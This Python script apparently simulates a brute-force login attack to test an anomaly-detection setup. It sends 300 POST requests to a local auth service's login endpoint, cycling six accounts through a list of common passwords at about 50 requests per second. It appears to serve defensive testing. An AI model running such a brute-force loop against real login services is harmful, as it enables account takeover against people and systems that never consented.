import os
import time
import random
import requests

USER_AUTH_URL = os.environ.get("USER_AUTH_URL", "http://user-auth:3000")
WAIT_BEFORE_ATTACK = int(os.environ.get("WAIT_BEFORE_ATTACK", "60"))

TARGET_ACCOUNTS = [
    "admin@auraweb.com",
    "yassine@auraweb.com",
    "contact@auraweb.com",
    "support@auraweb.com",
    "root@auraweb.com",
    "user@auraweb.com",
]

PASSWORD_LIST = [
    "123456", "password", "admin", "letmein", "welcome",
    "qwerty", "abc123", "iloveyou", "1234567890", "admin123",
    "pass123", "azerty", "000000", "password1", "test1234",
]

LOGIN_URL = f"{USER_AUTH_URL}/api/auth/login"

print(f"[attack-simulator] Target  : {LOGIN_URL}")
print(f"[attack-simulator] Accounts: {len(TARGET_ACCOUNTS)}")
print(f"[attack-simulator] Waiting {WAIT_BEFORE_ATTACK}s for model to train before attack...")
time.sleep(WAIT_BEFORE_ATTACK)

print(f"[attack-simulator] ========================================")
print(f"[attack-simulator] LAUNCHING BRUTE-FORCE ATTACK")
print(f"[attack-simulator] ========================================")

hits = 0
fails = 0

for i in range(300):
    email = TARGET_ACCOUNTS[i % len(TARGET_ACCOUNTS)]
    password = PASSWORD_LIST[i % len(PASSWORD_LIST)] if i < 150 else f"guess_{i}"

    try:
        resp = requests.post(
            LOGIN_URL,
            json={"email": email, "password": password},
            timeout=2,
        )
        status = resp.status_code
        icon = "✅ SUCCESS" if status == 200 else "❌ FAILED "
        print(f"[attack-simulator] {icon}  [{i+1:03d}/300]  {email:<30}  pwd: {password:<15}  → HTTP {status}")
        if status == 200:
            hits += 1
        else:
            fails += 1
    except Exception as e:
        print(f"[attack-simulator] ⚠️  TIMEOUT  [{i+1:03d}/300]  {email:<30}  pwd: {password:<15}  → {e}")
        fails += 1

    time.sleep(0.02)  # ~50 req/sec — enough to spike the 5-second scrape window

print(f"[attack-simulator] ========================================")
print(f"[attack-simulator] ATTACK COMPLETE")
print(f"[attack-simulator] ✅ Successful logins : {hits}")
print(f"[attack-simulator] ❌ Failed attempts   : {fails}")
print(f"[attack-simulator] ========================================")
print(f"[attack-simulator] Container staying alive — run 'docker logs attack-simulator' to review")
while True:
    time.sleep(3600)
